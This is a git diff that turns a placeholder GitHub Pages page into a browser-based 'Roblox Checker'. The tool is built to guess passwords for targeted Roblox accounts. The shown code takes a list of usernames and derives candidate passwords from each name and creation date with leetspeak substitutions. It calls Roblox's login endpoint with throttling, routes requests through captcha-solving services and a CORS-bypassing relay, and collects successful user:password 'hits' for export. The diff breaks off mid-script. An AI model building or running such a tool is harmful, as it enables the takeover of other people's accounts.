@@ -1,13 +1,457 @@
-
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>GitHub Pages Test</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0f1115">
+<meta name="description" content="Browser-side Roblox credential checker.">
+<title>Roblox Checker</title>
+<link rel="icon" href="data:,">
+<style>
+:root{
+  --bg:#0d0f13; --bg2:#12151b; --card:#161a22; --card2:#1c212b;
+  --line:#222833; --line2:#2e3542;
+  --tx:#e9ecf1; --mu:#8a93a3; --mu2:#5f6877;
+  --ac:#4fd1c5; --acd:#2b7f78;
+  --hit:#48d17f; --bad:#7b8496; --wr:#f0b429; --er:#f2635f;
+  --r:10px; --r2:8px;
+}
+*{box-sizing:border-box}
+html{scrollbar-color:#39414f transparent}
+body{
+  margin:0;background:var(--bg);color:var(--tx);
+  font:14px/1.55 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  -webkit-font-smoothing:antialiased;
+}
+::selection{background:var(--acd);color:#fff}
+:focus-visible{outline:2px solid var(--ac);outline-offset:2px}
+a{color:var(--ac)}
+
+/* ---------- top bar ---------- */
+header{
+  display:flex;align-items:center;gap:16px;flex-wrap:wrap;
+  padding:0 20px;height:56px;background:var(--bg2);
+  border-bottom:1px solid var(--line);position:sticky;top:0;z-index:30;
+}
+h1{margin:0;font-size:15px;font-weight:700;letter-spacing:-.01em;white-space:nowrap}
+h1 span{color:var(--ac)}
+.chip{
+  font:600 11px/1 ui-monospace,monospace;letter-spacing:.04em;
+  padding:6px 10px;border-radius:6px;white-space:nowrap;
+  background:var(--card2);color:var(--mu);border:1px solid var(--line2);
+}
+.chip.run{color:#0d1013;background:var(--ac);border-color:var(--ac)}
+.chip.pause{color:var(--wr);border-color:#4a3c14;background:#241f0e}
+.chip.done{color:var(--hit);border-color:#1e4230;background:#10201a}
+.chip.rate{color:var(--er);border-color:#4a2020;background:#241112}
+.spacer{flex:1}
+
+.bar-actions{display:flex;gap:8px}
+@media(max-width:760px){
+  header{height:auto;padding:12px 16px;gap:10px}
+  .spacer{display:none}
+  .bar-actions{width:100%;order:3}
+  .bar-actions .btn{flex:1}
+}
+
+/* ---------- shell ---------- */
+.shell{display:grid;grid-template-columns:390px 1fr;
+  height:calc(100vh - 56px);min-height:0}
+@media(max-width:760px){.shell{height:auto;grid-template-columns:1fr}}
+
+aside{
+  overflow-y:auto;border-right:1px solid var(--line);
+  padding:16px;background:var(--bg2);
+}
+@media(max-width:760px){aside{overflow:visible;border-right:0;
+  border-bottom:1px solid var(--line);height:auto}}
+
+main{display:flex;flex-direction:column;min-height:0;min-width:0}
+@media(max-width:760px){main{min-height:70vh}}
+
+/* ---------- progress ---------- */
+.prog{height:3px;background:var(--line);overflow:hidden;flex:none}
+.prog i{display:block;height:100%;width:0;
+  background:linear-gradient(90deg,var(--acd),var(--ac));
+  transition:width .35s cubic-bezier(.4,0,.2,1)}
+
+/* ---------- env ---------- */
+#env{display:none;padding:10px 20px;font-size:12.5px;
+  background:#2a1010;border-bottom:1px solid #4a2020;color:#f4a9a6}
+#env.on{display:block}
+#env b{color:#fff}
+
+/* ---------- cards ---------- */
+.card{
+  background:var(--card);border:1px solid var(--line);border-radius:var(--r);
+  padding:14px;margin-bottom:12px;
+}
+.card>h2{
+  margin:0 0 11px;font-size:11px;font-weight:700;letter-spacing:.1em;
+  text-transform:uppercase;color:var(--mu2);
+  display:flex;justify-content:space-between;align-items:center;
+}
+.card>h2 em{font-style:normal;color:var(--mu2);font-weight:600;letter-spacing:0}
+
+label.f{display:block;font-size:11px;font-weight:600;letter-spacing:.06em;
+  text-transform:uppercase;color:var(--mu);margin:0 0 6px}
+
+textarea,input[type=number],input[type=password],input[type=text],input[type=url]{
+  width:100%;padding:9px 11px;border:1px solid var(--line2);border-radius:var(--r2);
+  background:var(--bg);color:var(--tx);font:inherit;transition:.15s;
+}
+textarea:focus,input:focus{outline:none;border-color:var(--ac)}
+textarea{height:120px;resize:vertical;font:12px/1.7 ui-monospace,monospace}
+input[type=number]{font:600 14px/1.4 ui-monospace,monospace}
+.row{display:flex;gap:10px}
+.row>*{flex:1;min-width:0}
+.hint{font-size:11.5px;color:var(--mu2);margin-top:7px;line-height:1.5}
+code{font:11.5px ui-monospace,monospace;background:var(--bg);
+  padding:1px 5px;border-radius:4px;color:var(--ac)}
+
+.seg{display:flex;gap:3px;padding:3px;background:var(--bg);
+  border:1px solid var(--line2);border-radius:var(--r2)}
+.seg label{flex:1;position:relative}
+.seg input{position:absolute;opacity:0;pointer-events:none}
+.seg span{display:block;text-align:center;padding:8px 4px;border-radius:6px;
+  font-size:12px;font-weight:600;color:var(--mu);cursor:pointer;transition:.15s}
+.seg input:checked+span{background:var(--ac);color:#0d1013}
+.seg input:focus-visible+span{outline:2px solid var(--ac)}
+
+.presets{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+.presets button{padding:5px 10px;border-radius:6px;border:1px solid var(--line2);
+  background:transparent;color:var(--mu);font:600 11px/1.3 inherit;transition:.15s}
+.presets button:hover{color:var(--tx);border-color:var(--mu2)}
+.presets button.on{background:var(--ac);border-color:var(--ac);color:#0d1013}
+
+/* ---------- buttons ---------- */
+button{font:inherit;cursor:pointer}
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;
+  padding:9px 15px;border-radius:var(--r2);border:1px solid var(--line2);
+  background:var(--card2);color:var(--tx);font-weight:600;font-size:13px;
+  transition:.15s;white-space:nowrap;
+}
+.btn:hover:not(:disabled){background:#242a35;border-color:var(--mu2)}
+.btn:active:not(:disabled){transform:translateY(1px)}
+.btn.pri{background:var(--ac);border-color:var(--ac);color:#0d1013}
+.btn.pri:hover:not(:disabled){background:#63e0d4;border-color:#63e0d4}
+.btn.wr{background:#241f0e;border-color:#4a3c14;color:var(--wr)}
+.btn.dg{background:#241112;border-color:#4a2020;color:var(--er)}
+.btn:disabled{opacity:.35;cursor:not-allowed}
+.btn.sm{padding:6px 10px;font-size:12px}
+.btn.full{width:100%}
+
+/* ---------- diagnostics ---------- */
+.diag{display:flex;flex-direction:column;gap:5px;margin-top:10px}
+.drow{display:flex;align-items:center;justify-content:space-between;gap:10px;
+  padding:8px 10px;border-radius:6px;background:var(--bg);border:1px solid var(--line);
+  font:11.5px/1 ui-monospace,monospace;color:var(--mu)}
+.drow b{font-weight:600;color:var(--tx)}
+.pill{font:700 10px/1 ui-monospace,monospace;padding:4px 7px;border-radius:5px;letter-spacing:.05em}
+.pill.ok{background:#10201a;color:var(--hit);border:1px solid #1e4230}
+.pill.no{background:#241112;color:var(--er);border:1px solid #4a2020}
+.pill.wr{background:#241f0e;color:var(--wr);border:1px solid #4a3c14}
+.pill.wait{background:var(--card2);color:var(--mu2);border:1px solid var(--line2)}
+
+/* ---------- tabs ---------- */
+nav.tabs{display:flex;gap:2px;padding:0 20px;border-bottom:1px solid var(--line);
+  background:var(--bg2);flex:none}
+nav.tabs button{
+  padding:13px 15px;background:none;border:0;border-bottom:2px solid transparent;
+  color:var(--mu);font-weight:600;font-size:13px;transition:.15s;
+  display:flex;align-items:center;gap:7px;
+}
+nav.tabs button:hover{color:var(--tx)}
+nav.tabs button.on{color:var(--ac);border-bottom-color:var(--ac)}
+nav.tabs .n{font:700 10px/1 ui-monospace,monospace;background:var(--card2);
+  color:var(--mu);padding:3px 6px;border-radius:4px;border:1px solid var(--line2)}
+nav.tabs button.on .n{background:#10302c;color:var(--ac);border-color:var(--acd)}
+
+.panel{flex:1;min-height:0;display:flex;flex-direction:column;padding:16px 20px 20px}
+.panel>section{display:none;min-height:0}
+.panel>section.on{display:flex;flex-direction:column;flex:1}
+.panel>section.scroll.on{display:block;overflow-y:auto}
+
+/* ---------- toolbar ---------- */
+.toolbar{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap;flex:none}
+.fchip{padding:6px 11px;border-radius:6px;border:1px solid var(--line2);
+  background:transparent;color:var(--mu);font:600 11.5px/1.3 inherit;white-space:nowrap}
+.fchip:hover{color:var(--tx);border-color:var(--mu2)}
+.fchip.on{background:var(--card2);color:var(--tx);border-color:var(--mu2)}
+.fchip .n{color:var(--mu2);margin-left:5px;font-family:ui-monospace,monospace}
+
+/* ---------- log ---------- */
+#log{
+  flex:1;min-height:200px;overflow:auto;font:11.5px/1.65 ui-monospace,monospace;
+  background:#0a0c10;border:1px solid var(--line);border-radius:var(--r2);padding:4px;
+}
+.e{display:flex;gap:10px;padding:4px 8px;border-radius:4px;align-items:flex-start;
+  border-bottom:1px solid #13161c}
+.e:hover{background:#11141a}
+.e[hidden]{display:none}
+.e .t{color:var(--mu2);flex:none;font-variant-numeric:tabular-nums}
+.e .s{font-weight:700;flex:none;min-width:58px}
+.e .m{word-break:break-word;color:var(--tx)}
+.e .u{color:var(--mu)}
+.HIT .s{color:var(--hit)} .HIT{background:#0c1712}
+.BAD .s{color:var(--bad)} .CAPTCHA .s,.RATE .s{color:var(--wr)}
+.ERR .s{color:var(--er)} .INFO .s{color:var(--ac)}
+.empty{color:var(--mu2);text-align:center;padding:40px 10px;font-size:13px}
+
+/* ---------- hits ---------- */
+.hgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:10px}
+.hcard{background:var(--card);border:1px solid var(--line);
+  border-left:3px solid var(--hit);border-radius:var(--r2);padding:12px}
+.hcard .top{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-bottom:4px}
+.hcard .who{font-weight:700;font-size:14px;word-break:break-all}
+.tag2fa{font:700 9.5px/1 ui-monospace,monospace;padding:3px 6px;border-radius:4px;
+  background:#2a1f3d;color:#b18cf0;border:1px solid #3d2d57;letter-spacing:.05em}
+.pw{font:12px/1.5 ui-monospace,monospace;color:var(--ac);word-break:break-all}
+.meta{font:10.5px/1.4 ui-monospace,monospace;color:var(--mu2);margin-top:6px}
+.hcard .acts{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
+
+/* ---------- toasts ---------- */
+#toasts{position:fixed;right:20px;bottom:20px;z-index:50;
+  display:flex;flex-direction:column;gap:8px;align-items:flex-end;pointer-events:none}
+.toast{background:#eef2f6;color:#0d1013;font:600 12.5px/1 inherit;
+  padding:11px 16px;border-radius:7px;box-shadow:0 12px 32px -8px #000;
+  animation:pop .22s cubic-bezier(.2,1.3,.4,1)}
+@keyframes pop{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+footer{grid-column:1/-1;padding:14px 20px;border-top:1px solid var(--line);
+  color:var(--mu2);font-size:11.5px;background:var(--bg2)}
+
+@media(prefers-reduced-motion:reduce){*{animation-duration:.01ms!important;
+  transition-duration:.01ms!important}}
+</style>
 </head>
 <body>
-<h1>GitHub Pages is working!</h1>
-<p>Deployment successful.</p>
-</body>
-</html>
+
+<header>
+  <h1>Roblox <span>Checker</span></h1>
+  <div class="chip" id="chip" aria-live="polite">idle</div>
+  <div class="spacer"></div>
+  <div class="bar-actions">
+    <button class="btn pri" id="go">Start</button>
+    <button class="btn wr" id="pa" disabled>Pause</button>
+    <button class="btn" id="skip" disabled hidden>Skip account</button>
+    <button class="btn dg" id="sp" disabled>Stop</button>
+  </div>
+</header>
+
+<div id="env"></div>
+
+<div class="shell">
+  <aside id="tab-cfg">
+
+    <div class="card">
+      <h2>Connection <em id="diagSum"></em></h2>
+      <button class="btn full" id="diag">Run full diagnostics</button>
+      <div class="hint">Checks reachability, the CSRF handshake and a real login round-trip. Run this first.</div>
+      <div class="diag" id="diagList">
+        <div class="drow" data-k="auth"><span><b>auth.roblox.com</b></span><span class="pill wait">pending</span></div>
+        <div class="drow" data-k="users"><span><b>users.roblox.com</b></span><span class="pill wait">pending</span></div>
+        <div class="drow" data-k="csrf"><span><b>csrf token readable</b></span><span class="pill wait">pending</span></div>
+        <div class="drow" data-k="login"><span><b>login round-trip</b></span><span class="pill wait">pending</span></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Targets <em id="accCount">0</em></h2>
+      <label class="f" for="acc">Usernames — one per line</label>
+      <textarea id="acc" spellcheck="false" autocapitalize="off" autocomplete="off"
+        placeholder="MarkAnthony99&#10;nextuser&#10;# duplicates are dropped"></textarea>
+      <div class="hint">Candidates are derived from the name and the account's creation date.</div>
+    </div>
+
+    <div class="card">
+      <h2>Engine</h2>
+      <div class="row">
+        <div>
+          <label class="f" for="max">Attempts / account</label>
+          <input id="max" type="number" min="1" max="200" value="40" inputmode="numeric">
+        </div>
+        <div>
+          <label class="f" for="dly">Delay (ms)</label>
+          <input id="dly" type="number" min="5000" step="1000" value="60000" inputmode="numeric">
+        </div>
+      </div>
+      <div class="presets" id="maxPre">
+        <button data-v="20">20</button><button data-v="40" class="on">40</button><button data-v="80">80</button>
+      </div>
+      <div class="presets" id="dlyPre">
+        <button data-v="30000">30s</button><button data-v="60000" class="on">60s</button>
+        <button data-v="90000">90s</button><button data-v="120000">2m</button>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Captcha</h2>
+      <div class="seg" role="radiogroup" aria-label="Captcha provider">
+        <label><input type="radio" name="prov" value="manual" checked><span>Manual</span></label>
+        <label><input type="radio" name="prov" value="capsolver"><span>CapSolver</span></label>
+        <label><input type="radio" name="prov" value="2captcha"><span>2Captcha</span></label>
+      </div>
+      <div id="keyWrap" hidden style="margin-top:10px">
+        <label class="f" for="key">Solver API key</label>
+        <div class="row">
+          <input id="key" type="password" placeholder="paste key" autocomplete="off" spellcheck="false">
+          <button class="btn" id="keyEye" aria-label="Show key" style="flex:0 0 auto">show</button>
+        </div>
+      </div>
+      <div class="hint" id="capHint">Manual: a challenge pauses the run — solve it on roblox.com in another tab, then Resume.</div>
+    </div>
+
+    <div class="card">
+      <h2>Relay</h2>
+      <label class="f" for="proxy">Relay URL (optional)</label>
+      <input id="proxy" type="url" placeholder="https://your-worker.workers.dev/?url=" autocomplete="off" spellcheck="false">
+      <div class="hint">Only if diagnostics report <code>BLOCKED</code> or <code>HIDDEN</code>. See the README.</div>
+      <button class="btn sm" id="usePub" style="margin-top:9px">Try public relay</button>
+    </div>
+  </aside>
+
+  <main>
+    <div class="prog"><i id="prog"></i></div>
+
+    <nav class="tabs">
+      <button class="on" data-t="log">Log <span class="n" id="cAll">0</span></button>
+      <button data-t="hit">Hits <span class="n" id="navBadge">0</span></button>
+    </nav>
+
+    <div class="panel">
+      <section id="tab-log" class="on">
+        <div class="toolbar">
+          <button class="fchip on" data-f="ALL">All</button>
+          <button class="fchip" data-f="HIT">Hits <span class="n" id="cHit">0</span></button>
+          <button class="fchip" data-f="CAPTCHA">Captcha <span class="n" id="cCap">0</span></button>
+          <button class="fchip" data-f="BAD">Fails <span class="n" id="cBad">0</span></button>
+          <button class="fchip" data-f="ERR">Errors <span class="n" id="cErr">0</span></button>
+          <input id="logSearch" type="text" placeholder="filter text…" autocomplete="off"
+            style="flex:1;min-width:120px;max-width:260px">
+          <button class="btn sm" id="autoScroll" aria-pressed="true">auto-scroll</button>
+          <button class="btn sm dg" id="clearLog">clear</button>
+        </div>
+        <div id="log" role="log" aria-live="polite">
+          <div class="empty" id="logEmpty">Nothing yet — start a run.</div>
+        </div>
+      </section>
+
+      <section id="tab-hit" class="scroll">
+        <div class="toolbar">
+          <button class="btn sm" id="cp">Copy all</button>
+          <button class="btn sm" id="dl">Export JSON</button>
+          <button class="btn sm dg" id="cl">Clear</button>
+        </div>
+        <div class="hgrid" id="hits"></div>
+        <div class="empty" id="hitEmpty">No hits yet.</div>
+      </section>
+    </div>
+  </main>
+</div>
+
+<div id="toasts"></div>
+
+<script>
+"use strict";
+const $ = id => document.getElementById(id);
+const AUTH  = "https://auth.roblox.com/v2/login";
+const CSRF  = "https://auth.roblox.com/v2/logout";
+const USERS = "https://users.roblox.com";
+const COOKIE = ".ROBLOSECURITY";
+const LEET = {a:"@",e:"3",i:"1",o:"0",s:"$"};
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+let running=false, paused=false, stop=false, skipAcc=false;
+let hits=[], filter="ALL", tick=null, startedAt=0, pos=0, total=0;
+let autoScroll=true, csrfToken=null, cookieWarned=false;
+
+/* ================= environment ================= */
+if(location.protocol === "file:"){
+  $("env").className="on";
+  $("env").innerHTML="<b>Opened as a local file.</b> CORS will fail — serve it over http "+
+    "(<code>python3 -m http.server</code>) or use the Pages URL.";
+}
+
+/* ================= network ================= */
+function px(url){
+  const p = $("proxy").value.trim();
+  if(!p) return url;
+  return p.includes("{url}") ? p.replace("{url}", encodeURIComponent(url)) : p + encodeURIComponent(url);
+}
+async function call(url, opts){
+  const o = { credentials:"include", mode:"cors", ...(opts||{}) };
+  try{ return await fetch(px(url), o); }
+  catch(e){ const err=new Error("blocked by CORS / offline"); err.blocked=true; throw err; }
+}
+async function wait(ms){
+  let left = ms;
+  while(left > 0){
+    if(stop || skipAcc) return;
+    if(paused){ await sleep(120); continue; }
+    const chunk = Math.min(200, left);
+    await sleep(chunk);
+    left -= chunk;
+  }
+}
+
+/* ================= ui ================= */
+function toast(msg){
+  const d=document.createElement("div");
+  d.className="toast"; d.textContent=msg;
+  $("toasts").append(d);
+  setTimeout(()=>{ d.style.transition="opacity .2s"; d.style.opacity="0";
+    setTimeout(()=>d.remove(),220); },1700);
+}
+function setChip(state,text){
+  const c=$("chip"); c.className="chip"+(state?" "+state:""); c.textContent=text;
+}
+function setProg(pct){ $("prog").style.width=Math.max(0,Math.min(100,pct))+"%"; }
+function setRunUI(on){
+  $("go").disabled=on; $("pa").disabled=!on; $("sp").disabled=!on;
+  $("skip").hidden=!on; $("skip").disabled=!on;
+  $("pa").textContent=paused?"Resume":"Pause";
+  $("pa").className="btn "+(paused?"pri":"wr");
+}
+function elapsed(){
+  const s=Math.floor((Date.now()-startedAt)/1000);
+  return String(Math.floor(s/60)).padStart(2,"0")+":"+String(s%60).padStart(2,"0");
+}
+
+/* ================= log ================= */
+const counts={ALL:0,HIT:0,BAD:0,CAPTCHA:0,ERR:0,RATE:0,INFO:0};
+
+function say(status, detail, user, pass){
+  $("logEmpty")?.remove();
+  counts[status]=(counts[status]||0)+1; counts.ALL++;
+
+  const d=document.createElement("div");
+  d.className="e "+status; d.dataset.status=status;
+  const t=document.createElement("span"); t.className="t";
+  t.textContent=new Date().toLocaleTimeString([],{hour12:false});
+  const s=document.createElement("span"); s.className="s"; s.textContent=status;
+  const m=document.createElement("span"); m.className="m";
+  if(user){
+    const u=document.createElement("span"); u.className="u";
+    u.textContent=user+":"+pass+" "; m.append(u);
+  }
+  m.append(document.createTextNode(detail||""));
+  d.append(t,s,m);
+  d.dataset.txt=(status+" "+(user||"")+" "+(pass||"")+" "+(detail||"")).toLowerCase();
+  $("log").append(d);
+  while($("log").children.length>600) $("log").firstChild.remove();
+  paintCounts(); applyFilter();
+  if(autoScroll && !d.hidden) $("log").scrollTop=$("log").scrollHeight;
+}
+function paintCounts(){
+  $("cAll").textContent=counts.ALL;
+  $("cHit").textContent=counts.HIT||0;
+  $("cCap").textContent=counts.CAPTCHA||0;
+  $("cBad").textContent=counts.BAD||0;
+  $("cErr").textContent=counts.ERR||0;
+}
+function applyFilter(){
+  const q=$("logSearch").value.trim().toLowerCase();
+  for(const row of $("log").children){
+    if(row.classList.contains("empty")) continu
